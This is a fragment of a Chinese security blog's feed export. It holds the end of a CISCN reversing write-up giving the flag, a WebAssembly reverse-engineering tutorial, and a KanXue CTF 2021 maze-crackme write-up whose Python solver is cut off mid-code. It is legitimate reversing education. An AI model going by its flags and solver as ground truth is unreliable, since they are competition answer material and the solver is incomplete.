class="hljs-keyword">if</span>(arr1[var6] != <span class="hljs-number">0</span>) <span class="hljs-keyword">goto</span> _293;<br>_2c3: var6-=<span class="hljs-number">1</span>;<br>_2c4: var6-=<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>用 C 语言重新编译处理</p><img src="/2021/05/16/CISCN-Little-evil/image-20210516153045506.png" class="" title="image-20210516153045506"><p>用 IDA 调试分析</p><img src="/2021/05/16/CISCN-Little-evil/image-20210516153148968.png" class="" title="image-20210516153148968"><p>逻辑很简单，就是逐个字节比较输入的五位 flag，经过调试得出输入为: M5Ya7</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Ruby</tag>
      
      <tag>obfuscator</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebAssembly Reverse</title>
    <link href="/2021/05/14/WebAssembly-Reverse/"/>
    <url>/2021/05/14/WebAssembly-Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="WASM"><a href="#WASM" class="headerlink" title="WASM"></a>WASM</h1><h2 id="WASM-开发环境"><a href="#WASM-开发环境" class="headerlink" title="WASM 开发环境"></a>WASM 开发环境</h2><p><code>Emscripten SDK</code> 主流的 WASM 开发环境, 本文基于 <code>Emscripten</code> 环境编写</p><h3 id="安装-Emscripten"><a href="#安装-Emscripten" class="headerlink" title="安装 Emscripten"></a>安装 Emscripten</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> Get the emsdk repo</span><br>git clone https://github.com/emscripten-core/emsdk.git<br><br><span class="hljs-meta">#</span><span class="bash"> Enter that directory</span><br>cd emsdk<br><br><span class="hljs-meta">#</span><span class="bash"> Fetch the latest version of the emsdk (not needed the first time you <span class="hljs-built_in">clone</span>)</span><br>git pull<br><br><span class="hljs-meta">#</span><span class="bash"> Download and install the latest SDK tools.</span><br>./emsdk install latest<br><br><span class="hljs-meta">#</span><span class="bash"> Make the <span class="hljs-string">&quot;latest&quot;</span> SDK <span class="hljs-string">&quot;active&quot;</span> <span class="hljs-keyword">for</span> the current user. (writes .emscripten file)</span><br>./emsdk activate latest<br><br><span class="hljs-meta">#</span><span class="bash"> Activate PATH and other environment variables <span class="hljs-keyword">in</span> the current terminal</span><br>source ./emsdk_env.sh<br></code></pre></td></tr></table></figure><h3 id="编译-Hello-world"><a href="#编译-Hello-world" class="headerlink" title="编译 Hello world"></a>编译 Hello world</h3><p>1.c </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> d;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world.\n&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;d);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your input: %d\n&quot;</span>, d);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译并生成运行 html 页面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">emcc 1.c -o 1.html<br></code></pre></td></tr></table></figure><p>编译后当前目录下会生成三个文件: 1.html 1.js 1.wasm</p><p>目前主流的浏览器不支持 <code>file://</code> XHR 请求，因此要把这些文件放到 http server 上。</p><h2 id="js-与-wasm-的交互"><a href="#js-与-wasm-的交互" class="headerlink" title="js 与 wasm 的交互"></a>js 与 wasm 的交互</h2><p>通过js 层的 <code>ccall</code> 和 <code>cwarp</code> 调用 wasm 中的 C 函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;math.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123; <span class="hljs-comment">// to disable name-mangle</span><br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">int_sqrt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">sqrt</span>(x);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">emcc 1.cpp -o 1.html -s EXPORTED_FUNCTIONS=&#x27;[&quot;_int_sqrt&quot;, &quot;_main&quot;]&#x27; -s EXPORTED_RUNTIME_METHODS=&#x27;[&quot;ccall&quot;,&quot;cwrap&quot;]&#x27;<br></code></pre></td></tr></table></figure><p>调用接口</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">int_sqrt = Module.cwrap(<span class="hljs-string">&#x27;int_sqrt&#x27;</span>, <span class="hljs-string">&#x27;number&#x27;</span>, [<span class="hljs-string">&#x27;number&#x27;</span>])<br>int_sqrt(<span class="hljs-number">12</span>)<br>int_sqrt(<span class="hljs-number">28</span>)<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> result = Module.ccall(<span class="hljs-string">&#x27;int_sqrt&#x27;</span>, <span class="hljs-comment">// name of C function</span><br>  <span class="hljs-string">&#x27;number&#x27;</span>, <span class="hljs-comment">// return type</span><br>  [<span class="hljs-string">&#x27;number&#x27;</span>], <span class="hljs-comment">// argument types</span><br>  [<span class="hljs-number">28</span>]); <span class="hljs-comment">// arguments</span><br></code></pre></td></tr></table></figure><h2 id="一些基本的文件"><a href="#一些基本的文件" class="headerlink" title="一些基本的文件"></a>一些基本的文件</h2><p><code>.wasm</code> 二进制形式的代码</p><p><code>.wat</code> 文本形式(text format)的代码文件</p><p><code>wasm2wat</code> 可以将 <code>.wasm</code> 文件转换成 <code>.wat</code> 文件。</p><h1 id="WASM-静态分析"><a href="#WASM-静态分析" class="headerlink" title="WASM 静态分析"></a>WASM 静态分析</h1><p>WABT 是 WebAssembly 的二进制工具包</p><p>git 仓库地址:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">git@</span>github.com:WebAssembly/wabt.git<br></code></pre></td></tr></table></figure><p>编译方法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone git@github.com:WebAssembly/wabt.git<br>cd wabt<br>git submodule update --init<br>mkdir build<br>cd build<br>cmake ..<br>make -j8<br></code></pre></td></tr></table></figure><p>基本用法</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">wasm2wat 1.wasm -o test.wat # Parse from binary to text format<br>wasm2c 1.wasm -o test.c     # decompile to c<br></code></pre></td></tr></table></figure><p>wasm2c 反编译出来的 C 效果不是很好，可以用 gcc 编译 test.c，然后用 IDA 分析输出文件。</p><p>⚠️⚠️⚠️ wasm2c 的输出文件名一定不能是数字开头，否则 GCC 编译会出问题。</p><p>gcc 编译方法</p><ol><li>复制 wabt/wasm2c 下的头文件到 test.c 目录</li><li>用 gcc 编译</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -c test.c -o test.out<br></code></pre></td></tr></table></figure><p>效果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">strmlen</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * s)</span> </span>&#123;<br>    <span class="hljs-keyword">size_t</span> cnt = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ( *(s++) )cnt += <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> cnt;<br>&#125;<br></code></pre></td></tr></table></figure><p>用 IDA 逆向分析效果如下</p><img src="/2021/05/14/WebAssembly-Reverse/image-20210514222510337.png" class="" title="image-20210514222510337"><p>还是比较清晰的。</p><h2 id="调试方法"><a href="#调试方法" class="headerlink" title="调试方法"></a>调试方法</h2><p>一般没有源码只能用 <code>Chrome</code> 的 <code>DevTool</code> 调试。</p><p>DevTool 里面可以直接对 wasm 下断点。</p><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><p>Chrome 版本 Chrome 91 以上支持 Memory Inspect</p><img src="/2021/05/14/WebAssembly-Reverse/image-20210514174849940.png" class="" title="image-20210514174849940"><p>点击 【Scope】 中 memory 旁边的内存图标可以打开 memory panel，输入地址即可查看。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] Download and install Emscripten “<a href="https://emscripten.org/docs/getting_started/downloads.html#sdk-download-and-install&quot;">https://emscripten.org/docs/getting_started/downloads.html#sdk-download-and-install&quot;</a><br>[2] Emscripten Tutorial “<a href="https://emscripten.org/docs/getting_started/Tutorial.html&quot;">https://emscripten.org/docs/getting_started/Tutorial.html&quot;</a><br>[3] Interacting with code “<a href="https://emscripten.org/docs/porting/connecting_cpp_and_javascript/Interacting-with-code.html&quot;">https://emscripten.org/docs/porting/connecting_cpp_and_javascript/Interacting-with-code.html&quot;</a><br>[4] 一种Wasm逆向静态分析方法 “<a href="https://xz.aliyun.com/t/5170&quot;">https://xz.aliyun.com/t/5170&quot;</a></p>]]></content>
    
    
    <categories>
      
      <category>PL_Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Wasm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>看雪CTF2021</title>
    <link href="/2021/05/13/%E7%9C%8B%E9%9B%AACTF2021/"/>
    <url>/2021/05/13/%E7%9C%8B%E9%9B%AACTF2021/</url>
    
    <content type="html"><![CDATA[<h1 id="看雪CTF2021"><a href="#看雪CTF2021" class="headerlink" title="看雪CTF2021"></a>看雪CTF2021</h1><h2 id="第二题-南冥神功"><a href="#第二题-南冥神功" class="headerlink" title="第二题 南冥神功"></a>第二题 南冥神功</h2><p>简单迷宫题</p><p>map1 = [0x0, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    line = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">if</span> theMap[y * <span class="hljs-number">10</span> + x] == <span class="hljs-number">0</span>:<br>            line = line + <span class="hljs-string">&quot;.&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            line = line + <span class="hljs-string">&quot;#&quot;</span><br>    print(line)<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs clean">..#..#..##<br>##..#..#..<br>..#.#####.<br>.##.#..#..<br>..#..#..##<br>##.###.#.#<br>..####.#.#<br>.##..#.#.#<br>...#..##..<br></code></pre></td></tr></table></figure><p>.data:004B7040 a0123456789abcd db ‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’,0<br>loc_4B3DC5:             ; what is ecx<br>mov     eax, ecx<br>‘0’ =&gt; 0<br>‘1’ =&gt; 1<br>‘2’ =&gt; 2<br>‘9’ =&gt; 9<br>‘A’ =&gt; 0xA<br>‘F’ =&gt; 0xF</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs gml">alpha = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>i_1 =&gt; alpha.index(flag[flagPos])<br>v8 = i_1 + flagPos;<br>v10 = <span class="hljs-number">5</span> - v8 % <span class="hljs-number">6</span>;<br><span class="hljs-keyword">switch</span> ( v10 )<br><br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span><br>    <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> + <span class="hljs-number">1</span><br><span class="hljs-keyword">case</span> <span class="hljs-number">4</span><br>    <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> - <span class="hljs-number">1</span><br><br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>    当 <span class="hljs-symbol">y</span> 为偶数， <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> + <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">default</span><br>    如果 <span class="hljs-symbol">y</span> 为偶数, <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> + <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> - <span class="hljs-number">1</span><br><br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>    如果 <span class="hljs-symbol">y</span> 为奇数, <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> - <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> + <span class="hljs-number">1</span><br><br><span class="hljs-keyword">case</span> <span class="hljs-number">5</span><br>    如果 <span class="hljs-symbol">y</span> 为奇数, <span class="hljs-symbol">x</span> = <span class="hljs-symbol">x</span> - <span class="hljs-number">1</span><br>    <span class="hljs-symbol">y</span> = <span class="hljs-symbol">y</span> - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>一位flag字符决定两个方向指令<br>v2 = (flagPos + flagIdx / 6) % 6;<br>v1 = cur = 5 - (flagPos + flagIdx ) % 6;<br>爆破 flagIdx 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs python">map1 = [<span class="hljs-number">0x1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>]<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkValid</span>(<span class="hljs-params">theMap, x, y</span>):</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> y &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">9</span> <span class="hljs-keyword">or</span> y &gt; <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> theMap[y * <span class="hljs-number">10</span> + x] == <span class="hljs-number">0</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isAllClear</span>(<span class="hljs-params">theMap</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(theMap) == <span class="hljs-number">90</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">genNextValid</span>(<span class="hljs-params">theMap, x, y</span>):</span><br>    insList = []<br>    <span class="hljs-comment"># case1</span><br>    <span class="hljs-keyword">if</span> checkValid(theMap, x + <span class="hljs-number">1</span>, y):<br>        insList.append((<span class="hljs-number">1</span>, x + <span class="hljs-number">1</span>, y))<br><br>    <span class="hljs-comment"># case4</span><br>    <span class="hljs-keyword">if</span> checkValid(theMap, x - <span class="hljs-number">1</span>, y):<br>        insList.append((<span class="hljs-number">4</span>, x - <span class="hljs-number">1</span>, y))<br><br>    <span class="hljs-keyword">if</span> y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>        <span class="hljs-comment"># case2</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x + <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">2</span>, x + <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># default</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x + <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>):<br>            insList.append((-<span class="hljs-number">1</span>, x + <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case3</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">3</span>, x, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case5</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y - <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">5</span>, x, y - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># case2</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">2</span>, x, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># default</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x, y - <span class="hljs-number">1</span>):<br>            insList.append((-<span class="hljs-number">1</span>, x, y - <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case3</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x - <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">3</span>, x - <span class="hljs-number">1</span>, y + <span class="hljs-number">1</span>))<br>        <span class="hljs-comment"># case5</span><br>        <span class="hljs-keyword">if</span> checkValid(theMap, x - <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>):<br>            insList.append((<span class="hljs-number">5</span>, x - <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">return</span> insList<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dfs</span>(<span class="hljs-params">CurMap, curX, curY, InsList</span>):</span><br>    CurMap = CurMap.copy()<br>    CurMap[curY * <span class="hljs-number">10</span> + curX] = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">if</span> isAllClear(CurMap):<br>        print(<span class="hljs-string">&quot;Find Solve.&quot;</span>)<br>        print(InsList)<br>        <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>            line = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>                <span class="hljs-keyword">if</span> CurMap[y * <span class="hljs-number">10</span> + x] == <span class="hljs-number">0</span>:<br>                    line = line + <span class="hljs-string">&quot;.&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    line = line + <span class="hljs-string">&quot;#&quot;</span><br>            print(line)<br>        <span class="hljs-keyword">return</span> InsList<br><br><br>    curInsList = genNextValid(CurMap, curX, curY)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(curInsList) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    result = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> curInsList:<br>        InsList.append(i)<br>        dfs(CurMap, i[<span class="hljs-number">1</span>], i[<span class="hljs-number">2</span>], InsList)<br>        InsList.pop()<br>    <span class="hljs-keyword">return</span> result<br><br><br>dfs(map1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, [])<br><br><span class="hljs-comment"># alpha = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-comment"># i_1 =&gt; alpha.index(flag[flagPos])</span><br><span class="hljs-comment"># v8 = i_1 + flagPos;</span><br><span class="hljs-comment"># v10 = 5 - v8 % 6;</span><br>alpha = <span class="hljs-string">&#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>target = [(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>), (<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>), (<span 